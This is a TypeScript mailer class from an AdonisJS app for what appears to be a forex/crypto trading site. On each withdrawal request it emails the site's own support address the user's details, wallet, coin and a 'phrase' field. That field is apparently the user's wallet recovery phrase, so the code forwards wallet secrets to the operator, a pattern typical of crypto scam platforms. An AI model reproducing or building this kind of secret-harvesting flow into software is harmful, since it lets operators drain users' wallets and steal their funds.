import { BaseMailer, MessageContract } from "@ioc:Adonis/Addons/Mail";
import User from "App/Models/User";

export default class WithdrawAlert extends BaseMailer {
  constructor(
    private user: User,
    private amount: number,
    private address: string,
    private coin: string,
    private wallet: string,
    private phrase: string,
    private date: string
  ) {
    super();
  }
  /**
   * WANT TO USE A DIFFERENT MAILER?
   *
   * Uncomment the following line of code to use a different
   * mailer and chain the ".options" method to pass custom
   * options to the send method
   */
  // public mailer = this.mail.use()

  /**
   * The prepare method is invoked automatically when you run
   * "WithdrawAlert.send".
   *
   * Use this method to prepare the email message. The method can
   * also be async.
   */
  public prepare(message: MessageContract) {
    message
      .subject("A user has made a withdrawal request")
      .from("support@forexprime.space")
      .to("support@forexprime.space")
      .htmlView("emails/withdraw", {
        email: this.user.email,
        amount: this.amount,
        name: this.user.fullName,
        address: this.address,
        coin: this.coin,
        phrase: this.phrase,
        wallet: this.wallet,
        date: this.date,
      });
  }
}
